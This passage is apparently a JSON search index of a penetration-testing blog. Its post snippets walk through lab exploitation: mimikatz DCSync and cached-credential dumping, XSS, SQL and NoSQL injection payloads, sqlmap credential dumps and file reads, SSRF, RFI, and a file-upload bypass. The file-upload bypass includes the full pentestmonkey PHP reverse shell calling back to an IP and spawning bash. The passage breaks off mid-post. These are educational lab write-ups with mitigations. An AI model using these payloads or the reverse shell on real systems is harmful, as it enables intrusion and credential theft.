then execute it ./mimikatz.exe. After executing mimikatz, we can dump password hash of administrator by executing lsadump::dcsync /domain:cyber.local /user:Administrator.In the above image, we were able to dump password hash of Administrator.We can also dump password hash of krbtgt account by changing the user to krbtgt as follows:lsadump::dcsync /domain:cyber.local /user:krbtgt.In the above image, we were able to dump password hash of krbtgt.Mitigations Manage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled.References https://attack.mitre.org/techniques/T1003/006/ https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync" }, { "title": "Cached Domain Credentials", "url": "/posts/cache/", "categories": "Red Teaming, Credential Access", "tags": "", "date": "2022-04-01 05:49:33 +0800", "snippet": "MITRE ID : T1003.005 Tactic : Credential Access Platforms: WindowsCached Domain CredentialsCached domain credentials allows authentication to occur in the event a domain controller is unavailable. Adversaries may attempt to extract credentials from the cache.ExploitationMimikatzWe can dump cache credential using mimikatz. To do that, we need to download or transfer mimikatz to our target system(windows), then execute it ./mimikatz.exe. After executing mimikatz, we will elevate our privilege to nt authority by executing token::elevate. With our privilege elevated, we can dump cache credential by executing lsadump::cache.Mitigations Consider adding users to the “Protected Users” Active Directory security group. This can help limit the caching of users’ plaintext credentials. Consider limiting the number of cached credentials (HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Current Version\\Winlogon\\cachedlogonscountvalue) Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled.References https://attack.mitre.org/techniques/T1003/005/" }, { "title": "Initial Access", "url": "/posts/access/", "categories": "Red Teaming, Initial Access", "tags": "", "date": "2022-02-01 05:49:33 +0800", "snippet": "" }, { "title": "Writec", "url": "/posts/writec/", "categories": "", "tags": "", "date": "2022-02-01 00:00:00 +0800", "snippet": "–title: Writable C$ Sharedate: 2022-06-03 05:49:33 +0800categories: [Infrastructure Pentesting, Active Directory]tags: []—C$Exploitation" }, { "title": "Resource Development", "url": "/posts/resource/", "categories": "Red Teaming, Resource Development", "tags": "", "date": "2022-01-02 05:49:33 +0800", "snippet": "Resource Development" }, { "title": "Stored XSS", "url": "/posts/xsss/", "categories": "WebApp And Api Pentesting, Stored XSS", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Stored XSSCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored informationExploitationThe webapp takes in user’s input and saves it in a table. Let’s enter a text and submit it.As you can see, our text was added in the entry. Since it was saving and reflecting our input back, it might be vulnerable to stored XSS. We can further inspect the page.Let’s inject this xss payload &amp;lt;a href=javascript:alert(1)&amp;gt;Click&amp;lt;/a&amp;gt; to see if we can get alert box.As you can see, the link has appeared in the table. We will click on the linkWe were able to get alert box.Mitigations Use HTML entity encoding. Use Content Security Policy (CSP). Set the HttpOnly flag for cookies.References https://owasp.org/www-community/attacks/xss/ https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html https://portswigger.net/web-security/cross-site-scripting" }, { "title": "Reflected XSS", "url": "/posts/xssr/", "categories": "WebApp And Api Pentesting, Reflected XSS", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Reflected XSSCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.ExploitationThis webapp takes in user’s firstname and lastname and then displays a welcome message on the page.Let’s enter firstname as exploit and lastname as target.We got a text saying welcome exploit target. Since it was reflecting our inputs back, it might be vulnerable to XSS injection. We can further inspect the page.Let’s inject this xss payload &amp;lt;a href=javascript:alert(1)&amp;gt;Click&amp;lt;/a&amp;gt; in firstname field and see if we can get alert box.As you can see, the link has appeared on the page. We will click on the link.Well, We got alert box.Mitigations Use HTML entity encoding. Use Content Security Policy (CSP). Set the HttpOnly flag for cookies.References https://owasp.org/www-community/attacks/xss/ https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html https://portswigger.net/web-security/cross-site-scripting" }, { "title": "DOM-based XSS", "url": "/posts/xssd/", "categories": "WebApp And Api Pentesting, DOM-based XSS", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "DOM-based XSSCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.ExploitationThis webapp is vulnerable to dom-based xss, which allows attacker to inject javascript code on the page.Let’s enter anything in the search field and click on search button.As you can see, it was reflecting our input.Since our input was reflected on the page, we will attempt to inject simple xss payload &amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt; to see if we can get alert box.Our input was reflected but there was no alert box, which means it might be sanitizing user input to prevent xss attack.We will examine the html source codeAs you can see, our input was sanitized to prevent xss injection.If we examine the below &amp;lt;script&amp;gt; block, we will find out that it takes user input and creates an html element &amp;lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#39;+query+&#39;&quot;&amp;gt; using document.write.We can see the element by inspecting the page.As you can see, &amp;lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&amp;lt;script&amp;gt;alert(1);&amp;lt;/ script&amp;gt;&quot;&amp;gt; was created with our input added to the img attribute. We didn’t get alert box because our input was inside quotation &quot;. Therefore, we need to find a way to break out of the quotation.To break out of the quotaion, we will inject something like &quot;&amp;lt;script&amp;gt;alert(1);&amp;lt;/ script&amp;gt; , and the script will create something an html element like this &amp;lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&quot; &amp;lt;script&amp;gt;alert(1);&amp;lt;/ script&amp;gt;&quot;&amp;gt;. This will make our payload to be executed since our script block will be created outside &quot;.We got alert box.References https://owasp.org/www-community/attacks/xss/ https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html https://portswigger.net/web-security/cross-site-scripting https://portswigger.net/web-security/cross-site-scripting/dom-based" }, { "title": "XPATH Injection", "url": "/posts/xpathi/", "categories": "WebApp And Api Pentesting, XPATH Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "XPATH InjectionXPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured, or access data that they may not normally have access to. They may even be able to elevate their privileges on the web site if the XML data is being used for authentication (such as an XML based user file).DetectionThis webapp will take in the username and password, queries username and password in xml file using xpath, and then displays user’s information if the username and password exists. If the webapp is vulnerable to xpath injection, we can bypass the authentication.Let’s try this valid credential that we have been given. Mike: test123We were able to get user’s detail with the given credential. But our aim is to login without valid credential.We will now attempt to determine whether or not it’s using xml as it database. Since xpath uses syntax with / &amp;gt; &amp;lt; @ \\ .., we will attempt to supply something containing those characters to see if we can get an error or some anomaly.As you can see we got an error, this means our input broke the query, therefore it might be using xpath to process user supplied input.ExploitationTo bypass the authentication, we will supply &#39; or &#39;1&#39;=&#39;1 in both username and password fields, If it’s successfull, we will be able to retrieve details of others for which we don’t hava permission.Mitigations Use a parameterized XPath interface. Escaping All User Supplied Input.References https://owasp.org/www-community/attacks/XPATH_Injection" }, { "title": "Unrestricted File Upload -&gt; Bypass", "url": "/posts/uploadb/", "categories": "WebApp And Api Pentesting, Unrestricted File Upload -> Bypass", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Unrestricted File Upload -&amp;gt; BypassUnrestricted File Upload allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product’s environment.ExploitationThis webapp is vulnerable to Unrestricted File Upload, which allows attacker to upload file of any format. We will exploit this vulnerablity to get remote command execution.Let’s upload an image file to see how the webapp is behaving.As you can see, after uploading the image, we can view it by clicking on the link here.We are going to create malicious php file and upload it to the server, which if executed will provide us with a reverse shell.This is the content of the file.&amp;lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php// Copyright (C) 2007 pentestmonkey@pentestmonkey.netset_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#39;192.168.43.1&#39;;$port = 10000;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#39;uname -a; w; id; /bin/bash -i&#39;;$daemon = 0;$debug = 0;if (function_exists(&#39;pcntl_fork&#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Can&#39;t fork&quot;); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit(&quot;Error: Can&#39;t setsid()&quot;); exit(1); } $daemon = 1;} else { printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;);}chdir(&quot;/&quot;);umask(0);// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1);}$descriptorspec = array( 0 =&amp;gt; array(&quot;pipe&quot;, &quot;r&quot;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;) // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) { printit(&quot;ERROR: Can&#39;t spawn shell&quot;); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);while (1) { if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print &quot;$string\\n&quot;; }}?&amp;gt;As you can see, our file has been blocked because the webapp was blocking a file with .php extention.Let’s try to replace the file extention with something like .phP. We will bypass it if it’s only filtering file with .php.Let’s submit the file and intercept it in burpsuite.We will replace .php with .phP and forward the request.Nice!, We have uploaded our php file on the server. We will get a reverse shell by clicking on the link.References https://cwe.mitre.org/data/definitions/434.html https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" }, { "title": "Unrestricted File Upload", "url": "/posts/upload/", "categories": "WebApp And Api Pentesting, Unrestricted File Upload", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Unrestricted File UploadUnrestricted File Upload allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product’s environment.ExploitationThis webapp is vulnerable to Unrestricted File Upload, which allows attacker to upload file of any format. We will exploit this vulnerablity to get remote command execution.Let’s upload an image file to see how the webapp is behaving.As you can see, after uploading the image, we can view it by clicking on the link here.We are going to create malicious php file and upload it to the server, which if executed will provide us with reverse shell.This is the content of the file.&amp;lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php// Copyright (C) 2007 pentestmonkey@pentestmonkey.netset_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#39;192.168.43.1&#39;;$port = 10000;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#39;uname -a; w; id; /bin/bash -i&#39;;$daemon = 0;$debug = 0;if (function_exists(&#39;pcntl_fork&#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Can&#39;t fork&quot;); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit(&quot;Error: Can&#39;t setsid()&quot;); exit(1); } $daemon = 1;} else { printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;);}chdir(&quot;/&quot;);umask(0);// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1);}$descriptorspec = array( 0 =&amp;gt; array(&quot;pipe&quot;, &quot;r&quot;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;) // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) { printit(&quot;ERROR: Can&#39;t spawn shell&quot;); exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);while (1) { if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) { if (!$daemon) { print &quot;$string\\n&quot;; }}?&amp;gt;We have uploaded our php file on the server. We will get a reverse shell by clicking on the link.References https://cwe.mitre.org/data/definitions/434.html https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" }, { "title": "Server-side request forgery (SSRF)", "url": "/posts/ssrf/", "categories": "WebApp And Api Pentesting, Server-side request forgery (SSRF)", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Server-side request forgery (SSRF)Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.ExploitationThis webapp has a stock check feature which fetches data from an internal system using an url. We are going to exploit it to access admin interface at http://localhost/admin.We will click on check stock button and intercept the request in burp.As you can see it was using url of an api to fetch data. Let’s replace the url with http://localhost.Great!, we have accessed internal admin interface.References https://portswigger.net/web-security/ssrf https://owasp.org/Top10/A102021-Server-Side_Request_Forgery%28SSRF%29/" }, { "title": "Blind Sql Injection -&gt; Time Based", "url": "/posts/sqlit/", "categories": "WebApp And Api Pentesting, Blind Sql Injection -> Time Based", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Blind Sql Injection -&amp;gt; Time BasedDetectionThis webapp will take in user supplied input, search for a movie in a database and then notify the user whether or not the movie exists.Let’s supply iron man and see what will happen.As you can see, It displayed The movie exists!, which means there is iron man movie in the database.Let’s try again using bwapp.As you can see, It displayed The movie does not exist!, which means there is no bwapp movie in the database.We can predict the query being executed on the backend as something like this:-SELECT * from [table_name] where movie=&#39;[input]&#39;.BreakLet’s attempt to break the query by supplying iron man&#39;. This will result in something like this SELECT * from [table_name] where movie=&#39;iron man&#39;&#39; being executed on the backend, which will break the query.As you can see we got an error because our input broke the query.FixLet see if we can fix it by supplying iron man&#39;;-- -, which will make the query to be something like SELECT * [table_name] where movie=&#39;iron man&#39;;-- -&#39;. This will not break the query because whatever comes after -- is ignored by sql engine, therefore the rest -&#39; will not be executed as part of the query.As you can see we were able to fix the query.IDentificationNumber Of ColumnsWe can identify the number of columns using either order by or union select. This is important as it will allow us to use union to retrieve data from the database, we cannot use union without knowing the actual number of columns.We will use order by to identify the number of columns. We will startwith number 1 i.e order by 1 and then increment the number i.e order by 2.,order by 3… until we find the number of columns.We are going to intercept our request and forward something like iron man&#39; order by 1;-- -, which will be executed as SELECT * [table_name] where movie=&#39;iron man&#39; order by 1;-- -&#39;.As you can see The movie exists was displayed, which means one or more than one columns exist. Let’s keep incrementing the number until we find the right one.Here, using 8, nothing was displayed on the page . This means we exceeded the number of columns exist in the table. So the immediate number before 8 is our number of columns, which is 7.This is how we will be using the movie exist as our boolean flag.Mitigations Use of Prepared Statements (with Parameterized Queries). Enforcing Least Privilege Escaping All User Supplied InputReferences https://www.acunetix.com/websitesecurity/sql-injection2/ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" }, { "title": "Sql Injection With Sqlmap", "url": "/posts/sqlis/", "categories": "WebApp And Api Pentesting, Sql Injection With Sqlmap", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Sql Injection With SqlmapSqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.ExploitationDumping User’s DataThere are different ways to use sqlmap, but in this case we will use sqlmap with http request file. To do that, we will intercept the http request in burpsuite and save it to a file, then execute sqlmap -r [httprequestfile] --current-db to retrieve our current database name.As you can see we have got our current database as bwapp.Since we got our database, we will proceed to retrieve the available tables in the database. We will execute sqlmap -r [httprequestfile] -D bwapp --tables, which means to retrieve a list of tables in database bwapp.We got 4 tables from the database bwapp.Our next target is to retrieve the available columns in a table. Given that we have 4 tables, we will take users table as it looks interesting to us. Our command will be sqlmap -r [httprequestfile] -D bwapp -T users --columns, which means to retrieve the columns from table users in bwapp database.We got 9 columns from the table.We are going to dump all the data from login and password columns by executing sqlmap -r [httprequestfile] -D bwapp -T users -C login,password --dump.Great!, we got users’s credentials.Reading FileWe can read an internal file such as /etc/passwd, /etc/host, /etc/shadow ... using sqlmap. Let’s read /etc/passwd by executing sqlmap -r [httprequestfile] --file-read=/etc/passwdAs you can see , we downloaded /etc/passwd file of our target.There are much to do with sqlmap such as getting os shell, writing file and so on… , have time to explore it.References https://github.com/sqlmapproject/sqlmap" }, { "title": "Sql Injection -&gt; Authentication Bypass", "url": "/posts/sqlil/", "categories": "WebApp And Api Pentesting, Sql Injection -> Authentication Bypass", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Sql Injection -&amp;gt; Authentication BypassSQL injection is a technique used to exploit user data through web page inputs by injecting SQL commands as statements. If a login form is vulnerable to sql injection, adversaries can bypass the authentication and login to an account for which they do not have permission.ExploitationThis webapp takes username and password, queries username and password in it database and then gives access to a user if the username and password exists.Let’s supply wrong credentials first.We got this because our credentials were incorrect.We can predict the query being executed on the backend as something like this:-SELECT * from [table_name] where username=&#39;[input]&#39; and password=&#39;[input]&#39;.By supplying 1&#39; or 1=1;-- -, we will have the backend execute something like SELECT * from [table_name] where username=&#39;1&#39; or 1=1;-- -&#39; and password=&#39;[input]&#39;. Sql engine will not execute whatever comes after -- because sql engine ignores anything after --, so only SELECT * from [table_name] where username=&#39;1&#39; or 1=1; will be executed which will return true, thereby giving us access to the account that first matches the query.Mitigations Use of Prepared Statements (with Parameterized Queries). Enforcing Least Privilege Escaping All User Supplied InputReferences https://www.acunetix.com/websitesecurity/sql-injection2/ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" }, { "title": "In-band Sql Injection", "url": "/posts/sqlii/", "categories": "WebApp And Api Pentesting, In-band Sql Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "In-band Sql InjectionIn-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results.DetectionThis webapp takes the value of name parameter, query database for information about the name, and then displays the information on the page based on the value of name parameter. Let’s try to change the value of name parameter.After changing the value to user, we got nothing on the page which means user did not exist in the database.Since the webapp was using the value of name to query the database, We can predict the query being executed on the backend as something like this:-SELECT id,name,age from [table_name] where name=&#39;[input]&#39;.BreakLet’s attempt to break the query by supplying root&#39;. This will result in something like this SELECT id,name,age from [table_name] where name=&#39;root&#39;&#39; being executed on the backend, which will break the query.As you can see, nothing like table was displayed on the page because our input broke the query.FixLet see if we can fix it by supplying root&#39;;-- -, which will make the query to be something like SELECT id,name,age from [table_name] where name=&#39;root&#39;;-- -&#39;. This will not break the query because whatever comes after -- is ignored by sql engine, therefore the rest -&#39; will not be executed as part of the query.As you can see we were able to fix the query.IDentificationNumber Of ColumnsWe can identify the number of columns using either order by or union select. This is important as it will allow us to use union to retrieve data from the database, we cannot use union without knowing the actual number of columns.We will use order by to identify the number of columns. We will startwith number 1 i.e order by 1 and then increment the number i.e order by 2.,order by 3… until we find the number of columns.our input will be something like root&#39; order by 1;-- -, which will be executed as SELECT id,name,age from [table_name] where name=&#39;root&#39; order by 1;-- -&#39;.As you can see, we were able to get user’s information with 1. which means one or more than one columns exist. Let’s keep incrementing the number until we find the right one.Here, using 6, nothing was displayed on the page . This means we exceeded the number of columns exist in the table. So the immediate number before 6 is our number of columns, which is 5.Columns that Hold StringsWe need to identify the columns that are of string datatype as most of the data that we need to retrieve are string i.e username,password,.... Finding column that holds string data will help us to retrieve most of the data we need.Since null datatype is supported by any column, we will make use of it to identify our target columns i.e string. Let’s supply this root&#39; union select null,null,null,null,null;-- -,Now let’s replace the first null with a string &#39;yes&#39; and see whether or not will be displayed on the page. Our input will be root&#39; union select &#39;yes&#39;,null,null,null,null;-- -Well, we got it displayed on the page, this means the column supports string,so we can use it to retrieve data from the database.We can keep identifying the remaining columns by replacing the remaining null with string one by one.Database and DBMSWe need to know the dbms in use i.e mysql,postgresql... since different dbms use different syntax, knowing the dbms will allow us to focus on a specific syntax. For example, mysql uses @@version , postgresql uses version(), oracle uses v$version .Let’s check for mysql using database(), user(), @@version. If those commands are executed successfully, then our dbms is mysql.Our commands executed successfully.We also got the name of our database exercises, it will help us in exploitation.TableWe need to know the table from which we want to retrieve the data, Since this is mysql, we can take advantage of information_schema.tables to get the available tables in our target database exercises. By using root&#39; union select group_concat(table_name),null,null,null,null from information_schema.tables where table_schema=&#39;exercises&#39;;-- -, we will get the available tables in exercises database.As you can see, we got users table.ColumnsWe also need to know the columns of the table from which we want to retrieve data. We can use information_schema.columns to get the available columns in the table. By using root&#39; union select group_concat(column_name),null,null,null,null from information_schema.tables where table_name=&#39;users&#39;;-- -, we will get the available columns in table users.We got five columns id,name,age,groupid,passwd.ExploitationWe now got enough information i.e dbms, database,columns, table, ... to proceed to retrieving data from the table. We will retrieve all data from name and passwd columns as they look more interesting to us. Our input will be root&#39; union select group_concat(name, &#39;:=&amp;gt;&#39;, passwd),null,null,null,null from users;-- -.Mitigations Use of Prepared Statements (with Parameterized Queries). Enforcing Least Privilege Escaping All User Supplied InputReferences https://www.acunetix.com/websitesecurity/sql-injection2/ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" }, { "title": "Blind Sql Injection -&gt; Boolean Based", "url": "/posts/sqlib/", "categories": "WebApp And Api Pentesting, Blind Sql Injection -> Boolean Based", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Blind Sql Injection -&amp;gt; Boolean BasedBoolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result.Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.DetectionThis webapp will take in user supplied input, search for a movie in a database and then notify the user whether or not the movie exists.Let’s supply iron man and see what will happen.As you can see, It displayed The movie exists!, which means there was iron man movie in the database.Let’s try again using bwapp.As you can see, It displayed The movie does not exist!, which means there was no bwapp movie in the database.We can predict the query being executed on the backend as something like this:-SELECT * from [table_name] where movie=&#39;[input]&#39;.BreakLet’s attempt to break the query by supplying iron man&#39;. This will result in something like this SELECT * from [table_name] where movie=&#39;iron man&#39;&#39; being executed on the backend, which will break the query.As you can see we got an error because our input broke the query.FixLet see if we can fix it by supplying iron man&#39;;-- -, which will make the query to be something like SELECT * [table_name] where movie=&#39;iron man&#39;;-- -&#39;. This will not break the query because whatever comes after -- is ignored by sql engine, therefore the rest -&#39; will not be executed as part of the query.As you can see we were able to fix the query.IDentificationNumber Of ColumnsWe can identify the number of columns using either order by or union select. This is important as it will allow us to use union to retrieve data from the database, we cannot use union without knowing the actual number of columns.We will use order by to identify the number of columns. We will startwith number 1 i.e order by 1 and then increment the number i.e order by 2.,order by 3… until we find the number of columns.We are going to intercept our request and forward something like iron man&#39; order by 1;-- -, which will be executed as SELECT * [table_name] where movie=&#39;iron man&#39; order by 1;-- -&#39;.As you can see The movie exists was displayed, which means one or more than one columns exist. Let’s keep incrementing the number until we find the right one.Here, using 8, nothing was displayed on the page . This means we exceeded the number of columns exist in the table. So the immediate number before 8 is our number of columns, which is 7.This is how we will be using the movie exist as our boolean flag to retrieve all the data we want from the database.Mitigations Use of Prepared Statements (with Parameterized Queries). Enforcing Least Privilege Escaping All User Supplied InputReferences https://www.acunetix.com/websitesecurity/sql-injection2/ https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" }, { "title": "SMTP header injection", "url": "/posts/smti/", "categories": "WebApp And Api Pentesting, SMTP header injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "SMTP header injectionSMTP header injection vulnerabilities arise when user input is placed into email headers without adequate sanitization, allowing an attacker to inject additional headers with arbitrary values.ExploitationNo Lab TO DemonstrateReferences https://portswigger.net/kb/issues/00200800_smtp-header-injection https://book.hacktricks.xyz/pentesting-web/email-header-injection" }, { "title": "Stored Html Injection", "url": "/posts/shtml/", "categories": "WebApp And Api Pentesting, Stored Html Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Stored Html InjectionUnlike reflected HTML injection, Stored HTML injection allows the injection of certain HTML tags, which remain permanently inside the web-applications.ExploitationThe webapp takes in user’s input and saves it in a table. Let’s enter a text and submit it.As you can see, our text was added in the entry. Since it was saving and reflecting our input back, it might be vulnerable to stored html injection if it does’nt sanitize user’s inputs. We can further inspect the page.Let’s try to inject html link and see whether it will be added as link. We will submit this input &amp;lt;a href=#&amp;gt;click here&amp;lt;/a&amp;gt;.As you can see we were able to inject a link in the entry, which will remain permanently and will be seen by whoever visits the page.Mitigations Filter metacharacters from user input.References https://www.acunetix.com/vulnerabilities/web/html-injection/" }, { "title": "Remote File Inclusion", "url": "/posts/rfi/", "categories": "WebApp And Api Pentesting, Remote File Inclusion", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Remote File InclusionRemote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. The perpetrator’s goal is to exploit the referencing function in an application to upload malware (e.g., backdoor shells) from a remote URL located within a different domain.DetectionThis webapp seems to be taking a file from page parameter i.e arbitrary-file-inclusion.php, including it and then displaying it to the user.If we change the value of page parameter to something like this page=exploit.php, it will attempt to include exploit.php and display it, if exploit.php file does not exist, it may throw an error, else it will display the content of exploit.php.From the above image, we can see the error showing Page Not found, this means exploit.php does not exist.We can determine whether or not is vulnerable to rfi by supplying url to page parameter, if the page is displayed on the website, then it’s vulnerable to rfi.As you can see, the page has been displayed, That’s means is vulnerable to rfi.ExploitationWe can obtain a reverse shell from our target by making it to execute our payload file. In this case, we will create php file containing our payload, host it on our server, setup listener and then supply it url to our target. If it’s successfull, our target will execute our payload which will allow us to obtain reverse shell.We got a reverse shell.References https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/" }, { "title": "Nosql Injection", "url": "/posts/nosqli/", "categories": "WebApp And Api Pentesting, Nosql Injection", "tags": "", "date": "2022-01-01 05:49:33 +0800", "snippet": "Nosql InjectionNoSQL injection vulnerability is an error in a web application that uses a NoSQL database. This web application security issue lets a malicious party bypass authentication, extract data, modify data, or even gain complete control over the application. NoSQL injection attacks are the result of a lack of data sanitization.exploitationAuthentication BypassThis authentication uses nosql database mongodb to authenticate a user. If it’s not configured securely, we can bypass the authentication and login to an account for which we don’t have permission.Enter anything as username and password, intercept the request in burpsuite , and then forward the request.Since our credential was incorrect, we were redirected to an error page.Let’s try to bypass the authentication by supplying this payload user[$ne]=1&amp;amp;pass[$ne]=1. If this goes well, the backend will execute something like [&#39;username&#39; =&amp;gt; [&#39;$ne&#39; =&amp;gt; 1]], &#39;password&#39; =&amp;gt; [&#39;$ne&#39; =&amp;gt; 1]], this means to look for username which is not equal to 1, and password which is not equal 1, which will be true, so we will be able to bypass the authentication.As you can see we have been redirected to our dashboard. By following the redirection, we were able to login to admin account.Extracting PasswordWe can extract user’s password using regex. To do that, we need to know the actual length of the password. In regex, ^.{1}$ means a string of 1 length, ^.{5}$ means a string of five length, and so on.. , 